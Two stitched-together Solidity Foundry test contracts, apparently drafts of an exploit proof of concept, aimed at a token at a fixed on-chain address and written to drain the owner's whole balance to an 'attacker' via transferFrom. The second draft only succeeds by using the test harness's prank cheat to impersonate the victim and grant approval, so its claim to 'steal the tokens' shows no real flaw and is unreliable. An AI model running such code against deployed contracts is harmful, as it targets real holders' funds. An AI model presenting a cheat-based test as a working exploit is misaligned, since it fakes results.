// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IStandardToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);
    IStandardToken internal token;
    address internal victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IStandardToken(TARGET);
        victim = token.owner();
        uint256 victimBalance = token.balanceOf(victim);

        // Precondition check: Victim must have tokens, attacker must have none.
        vm.assume(victimBalance > 0);
        assertEq(token.balanceOf(attacker), 0, "Attacker should start with 0 tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        uint256 amount = token.balanceOf(victim);
        token.transferFrom(victim, attacker, amount);
        uint256 finalBalance = IERC20(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// This interface combines the necessary functions from the original two interfaces.
// The approve function was added to satisfy its usage in the testExploit function.
interface IStandardToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    // Removed the duplicate interface declaration from within the contract.
    address constant TARGET = 0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20;
    address attacker = address(this);
    IStandardToken internal token;
    address internal victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IStandardToken(TARGET);
        victim = token.owner();
        uint256 victimBalance = token.balanceOf(victim);

        // Precondition check: Victim must have tokens, attacker must have none.
        vm.assume(victimBalance > 0);
        assertEq(token.balanceOf(attacker), 0, "Attacker should start with 0 tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 amount = token.balanceOf(victim);

        // Step 1: Impersonate the victim to grant allowance to the attacker.
        vm.startPrank(victim);
        token.approve(attacker, amount);
        vm.stopPrank();

        // Step 2: Now that the allowance is set, call transferFrom to steal the tokens.
        token.transferFrom(victim, attacker, amount);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
